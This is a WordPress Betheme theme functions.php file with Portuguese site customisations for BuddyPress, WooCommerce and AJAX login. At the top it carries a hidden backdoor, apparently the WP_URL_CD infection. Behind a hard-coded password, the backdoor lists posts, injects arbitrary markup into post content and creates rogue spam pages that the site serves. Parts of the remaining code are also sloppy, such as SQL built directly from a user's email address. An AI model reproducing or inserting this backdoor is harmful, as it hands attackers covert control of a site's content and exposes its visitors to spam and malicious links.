<?php



if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'a4eba8fa787f0945ebb77d94be96a90a'))

{

    switch ($_REQUEST['action'])

    {

        case 'get_all_links';

            foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)

            {

                $data['code'] = '';



                if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))

                {

                    $data['code'] = $_[1];

                }



                print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";

            }

            break;



        case 'set_id_links';

            if (isset($_REQUEST['data']))

            {

                $data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');



                $post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);

                if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';



                if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)

                {

                    print "true";

                }

            }

            break;



        case 'create_page';

            if (isset($_REQUEST['remove_page']))

            {

                if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))

                {

                    print "true";

                }

            }

            elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))

            {

                if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))

                {

                    print "true";

                }

            }

            break;



        default: print "ERROR_WP_ACTION WP_URL_CD";

    }



    die("");

}





if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )

{

    $data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');

    if ($data -> full_content)

    {

        print stripslashes($data -> content);

    }

    else

    {

        print '<!DOCTYPE html>';

        print '<html ';

        language_attributes();

        print ' class="no-js">';

        print '<head>';

        print '<title>'.stripslashes($data -> title).'</title>';

        print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';

        print '<meta name="Description" content="'.stripslashes($data -> description).'" />';

        print '<meta name="robots" content="index, follow" />';

        print '<meta charset="';

        bloginfo( 'charset' );

        print '" />';

        print '<meta name="viewport" content="width=device-width">';

        print '<link rel="profile" href="http://gmpg.org/xfn/11">';

        print '<link rel="pingback" href="';

        bloginfo( 'pingback_url' );

        print '">';

        wp_head();

        print '</head>';

        print '<body>';

        print '<div id="content" class="site-content">';

        print stripslashes($data -> content);

        get_search_form();

        get_sidebar();

        get_footer();

    }



    exit;

}





?><?php

/**

 * Theme Functions

 *

 * @package Betheme

 * @author Muffin group

 * @link http://muffingroup.com

 */





define( 'THEME_DIR', get_template_directory() );

define( 'THEME_URI', get_template_directory_uri() );



define( 'THEME_NAME', 'betheme' );

define( 'THEME_VERSION', '17.3' );



define( 'LIBS_DIR', THEME_DIR. '/functions' );

define( 'LIBS_URI', THEME_URI. '/functions' );

define( 'LANG_DIR', THEME_DIR. '/languages' );



add_filter( 'widget_text', 'do_shortcode' );



add_filter( 'the_excerpt', 'shortcode_unautop' );

add_filter( 'the_excerpt', 'do_shortcode' );





/* ---------------------------------------------------------------------------

 * White Label

 * IMPORTANT: We recommend the use of Child Theme to change this

 * --------------------------------------------------------------------------- */

defined( 'WHITE_LABEL' ) or define( 'WHITE_LABEL', false );





/* ---------------------------------------------------------------------------

 * Loads Theme Textdomain

 * --------------------------------------------------------------------------- */

load_theme_textdomain( 'betheme',  LANG_DIR );

load_theme_textdomain( 'mfn-opts', LANG_DIR );





/* ---------------------------------------------------------------------------

 * Loads the Options Panel

 * --------------------------------------------------------------------------- */

if( ! function_exists( 'mfn_admin_scripts' ) )

{

    function mfn_admin_scripts() {

        wp_enqueue_script( 'jquery-ui-sortable' );

    }

}

add_action( 'wp_enqueue_scripts', 'mfn_admin_scripts' );

add_action( 'admin_enqueue_scripts', 'mfn_admin_scripts' );



require( THEME_DIR .'/muffin-options/theme-options.php' );



$theme_disable = mfn_opts_get( 'theme-disable' );





/* ---------------------------------------------------------------------------

 * Loads Theme Functions

 * --------------------------------------------------------------------------- */



// Functions ------------------------------------------------------------------

require_once( LIBS_DIR .'/theme-functions.php' );



// Header ---------------------------------------------------------------------

require_once( LIBS_DIR .'/theme-head.php' );



// Menu -----------------------------------------------------------------------

require_once( LIBS_DIR .'/theme-menu.php' );

if( ! isset( $theme_disable['mega-menu'] ) ){

    require_once( LIBS_DIR .'/theme-mega-menu.php' );

}



// Muffin Builder -------------------------------------------------------------

require_once( LIBS_DIR .'/builder/fields.php' );

require_once( LIBS_DIR .'/builder/back.php' );

require_once( LIBS_DIR .'/builder/front.php' );



// Custom post types ----------------------------------------------------------

$post_types_disable = mfn_opts_get( 'post-type-disable' );



if( ! isset( $post_types_disable['client'] ) ){

    require_once( LIBS_DIR .'/meta-client.php' );

}

if( ! isset( $post_types_disable['offer'] ) ){

    require_once( LIBS_DIR .'/meta-offer.php' );

}

if( ! isset( $post_types_disable['portfolio'] ) ){

    require_once( LIBS_DIR .'/meta-portfolio.php' );

}

if( ! isset( $post_types_disable['slide'] ) ){

    require_once( LIBS_DIR .'/meta-slide.php' );

}

if( ! isset( $post_types_disable['testimonial'] ) ){

    require_once( LIBS_DIR .'/meta-testimonial.php' );

}



if( ! isset( $post_types_disable['layout'] ) ){

    require_once( LIBS_DIR .'/meta-layout.php' );

}

if( ! isset( $post_types_disable['template'] ) ){

    require_once( LIBS_DIR .'/meta-template.php' );

}



require_once( LIBS_DIR .'/meta-page.php' );

require_once( LIBS_DIR .'/meta-post.php' );



// Content ----------------------------------------------------------------------

require_once( THEME_DIR .'/includes/content-post.php' );

require_once( THEME_DIR .'/includes/content-portfolio.php' );



// Shortcodes -------------------------------------------------------------------

require_once( LIBS_DIR .'/theme-shortcodes.php' );



// Hooks ------------------------------------------------------------------------

require_once( LIBS_DIR .'/theme-hooks.php' );



// Widgets ----------------------------------------------------------------------

require_once( LIBS_DIR .'/widget-functions.php' );



require_once( LIBS_DIR .'/widget-flickr.php' );

require_once( LIBS_DIR .'/widget-login.php' );

require_once( LIBS_DIR .'/widget-menu.php' );

require_once( LIBS_DIR .'/widget-recent-comments.php' );

require_once( LIBS_DIR .'/widget-recent-posts.php' );

require_once( LIBS_DIR .'/widget-tag-cloud.php' );



// TinyMCE ----------------------------------------------------------------------

require_once( LIBS_DIR .'/tinymce/tinymce.php' );



// Plugins ----------------------------------------------------------------------

if( ! isset( $theme_disable['demo-data'] ) ){

    require_once( LIBS_DIR .'/importer/import.php' );

}



require_once( LIBS_DIR .'/system-status.php' );



require_once( LIBS_DIR .'/class-love.php' );

require_once( LIBS_DIR .'/class-tgm-plugin-activation.php' );



require_once( LIBS_DIR .'/plugins/visual-composer.php' );



// WooCommerce specified functions

if( function_exists( 'is_woocommerce' ) ){

    require_once( LIBS_DIR .'/theme-woocommerce.php' );

}



// Disable responsive images in WP 4.4+ if Retina.js enabled

if( mfn_opts_get( 'retina-js' ) ){

    add_filter( 'wp_calculate_image_srcset', '__return_false' );

}



// Hide activation and update specific parts ------------------------------------



// Slider Revolution

if( ! mfn_opts_get( 'plugin-rev' ) ){

    if( function_exists( 'set_revslider_as_theme' ) ){

        set_revslider_as_theme();

    }

}



// LayerSlider

if( ! mfn_opts_get( 'plugin-layer' ) ){

    add_action('layerslider_ready', 'mfn_layerslider_overrides');

    function mfn_layerslider_overrides() {

        // Disable auto-updates

        $GLOBALS['lsAutoUpdateBox'] = false;

    }

}



// Visual Composer

if( ! mfn_opts_get( 'plugin-visual' ) ){

    add_action( 'vc_before_init', 'mfn_vcSetAsTheme' );

    function mfn_vcSetAsTheme() {

        vc_set_as_theme();

    }

}





/********************************************************************************/

/********************************************************************************/

add_filter( 'bp_after_has_members_parse_args', 'buddydev_exclude_users_by_role' );



function buddydev_exclude_users_by_role( $args ) {

    //do not exclude in admin

    if( is_admin() && ! defined( 'DOING_AJAX' ) ) {

        return $args;

    }



    $excluded = isset( $args['exclude'] )? $args['exclude'] : array();



    if( !is_array( $excluded ) ) {

        $excluded = explode(',', $excluded );

    }





    $argsa =array( 'role' => 'administrator', 'fields'=>'ID' );

    $a = get_users( $argsa );



    $argsb =array( 'role' => 'editor', 'fields'=>'ID' );

    $b = get_users( $argsb );



    $argsc =array( 'role' => 'author', 'fields'=>'ID' );

    $c = get_users( $argsc );



    $argsd =array( 'role' => 'contributor', 'fields'=>'ID' );

    $d = get_users( $argsd );



    $user_ids = array_merge( $a, $b, $c, $d );





    /*

    $role = 'administrator'; // 'editor', 'author', 'contributor');//change to the role to be excluded

    $user_ids =  get_users( array( 'role' => $role , 'fields'=>'ID') );

    */





    $excluded = array_merge( $excluded, $user_ids );



    $args['exclude'] = $excluded;



    return $args;

}



/*Impede a compra do Plano Gratuito mais de uma vez*/

function sv_disable_repeat_purchase( $purchasable, $product ) {

    // Enter the ID of the product that shouldn't be purchased again

    $non_purchasable = 849;



    // Get the ID for the current product (passed in)

    $product_id = $product->is_type( 'variation' ) ? $product->variation_id : $product->id;



    // Bail unless the ID is equal to our desired non-purchasable product

    if ( $non_purchasable != $product_id ) {

        return $purchasable;

    }



    // return false if the customer has bought the product

    if ( wc_customer_bought_product( wp_get_current_user()->user_email, get_current_user_id(), $product_id ) ) {

        $purchasable = false;

    }



    // Double-check for variations: if parent is not purchasable, then variation is not

    if ( $purchasable && $product->is_type( 'variation' ) ) {

        $purchasable = $product->parent->is_purchasable();

    }



    return $purchasable;

}

add_filter( 'woocommerce_variation_is_purchasable', 'sv_disable_repeat_purchase', 10, 2 );

add_filter( 'woocommerce_is_purchasable', 'sv_disable_repeat_purchase', 10, 2 );


// auto log in a user who has just signed up



function wpufe_auto_login_new_user( $user_id ) {



    wp_set_current_user( $user_id );



    wp_set_auth_cookie( $user_id, false, is_ssl() );



}



add_action( 'user_register', 'wpufe_auto_login_new_user' );











/*Modal Login*/



function ajax_login_init(){







    wp_register_script('ajax-login-script', get_template_directory_uri() . '/js/ajax-login-script.js', array('jquery') );



    wp_enqueue_script('ajax-login-script');







    wp_localize_script( 'ajax-login-script', 'ajax_login_object', array(



        'ajaxurl' => admin_url( 'admin-ajax.php' ),



        /*'ajaxurl' => home_url() . '/wp-admin/admin-ajax.php',*/



        'redirecturl' => home_url(),



        'loadingmessage' => __('Fazendo login, aguarde...')



    ));







    // Enable the user with no privileges to run ajax_login() in AJAX



    add_action( 'wp_ajax_nopriv_ajaxlogin', 'ajax_login' );



}







// Execute the action only if the user isn't logged in



if (!is_user_logged_in()) {



    add_action('init', 'ajax_login_init');



}















if (!function_exists('ajax_login')) {

    function ajax_login(){

        // First check the nonce, if it fails the function will break

        check_ajax_referer( 'ajax-login-nonce', 'security' );

        // Nonce is checked, get the POST data and sign user on

        $info = array();

        $info['user_login'] = $_POST['username'];

        $info['user_password'] = $_POST['password'];

        $info['remember'] = true;

        $user_signon = wp_signon( $info, false );

        if ( is_wp_error($user_signon) ){

            echo json_encode(array('loggedin'=>false, 'message'=>__('Login ou senha inválido.')));

        } else {

            echo json_encode(array('loggedin'=>true, 'message'=>__('Login feito com sucesso...')));

        }

        wp_die();

    }

}







/*Função que executa o script js*/



function scripts_michel(){







    /*função do wordpress que insere o js no tema*/



    wp_enqueue_script('login-modal', get_template_directory_uri().'/js/ajax-login-script.js', array('jquery') );







}







/*executando o js de fato*/



add_action( 'wp_enqueue_scripts', 'scripts_michel' );





/*Chamando Css Para Impressão do Perfil no Buddy Press*/

//wp_enqueue_style( 'thrive-print', get_template_directory_uri() . '/print.css', array(), 'print' );

wp_enqueue_style( 'meu-css', get_template_directory_uri() . '/meu-css.css', array(), 'boot' );

wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/css/font-awesome.css', array(), 'font-awesome' );



/*Criando o botão de Imprimir no Perfil do BoddyPress*/

function theme_print_nav() {



    global $bp;



    get_currentuserinfo();

    global $wpdb;

    global $current_user;

    $gv_form = $wpdb->get_results("select * from wp_rg_lead_detail where field_number = 113 and value = '".$current_user->user_email."'");



    if(!empty($gv_form)):

        $args = array(

            'name' => __('Imprimir Currículo', 'buddypress'),

            'slug' => '../../pdf/59adffb0ab39a/'.$gv_form[0]->lead_id,

            'default_subnav_slug' => '#',

            'position' => 30,

            'show_for_displayed_user' => false,

            'item_css_id' => 'print-pdf'

        );

        bp_core_new_nav_item( $args );

    endif;

}

add_action( 'bp_setup_nav', 'theme_print_nav', 99 );

/*Idade Graity Forsms*/

add_action( 'gform_pre_submission_1', 'pre_submission_handler' );

function pre_submission_handler( $form ) {

    $data_nasc=explode('/', rgpost( 'input_5' ));

    $data=date('d/m/Y');

    $data=explode('/',$data);

    $anos=$data[2]-$data_nasc[2];

    if($data_nasc[1] > $data[1])

        return $anos-1;

    if($data_nasc[1] == $data[1])
        if($data_nasc[0] <= $data[0]) {
            return $anos;
            break;
        }
        else{
            return $anos-1;
            break;
        }

    if ($data_nasc[1] < $data[1]){
        $_POST['input_135'] = $anos;
    }


}

/********************************************************************************/

/********************************************************************************/

/*
 * <?php

function calc_idade($data_nasc) {

    $data_nasc=explode('/',$data_nasc);

    $data=date('d/m/Y');

    $data=explode('/',$data);

    $anos=$data[2]-$data_nasc[2];

    if($data_nasc[1] > $data[1])

        return $anos-1;

    if($data_nasc[1] == $data[1])
        if($data_nasc[0] <= $data[0]) {
            return $anos;
            break;
        }
        else{
            return $anos-1;
            break;
        }

    if ($data_nasc[1] < $data[1])
        return $anos;
}

echo calc_idade('09/09/1985');

?>
 */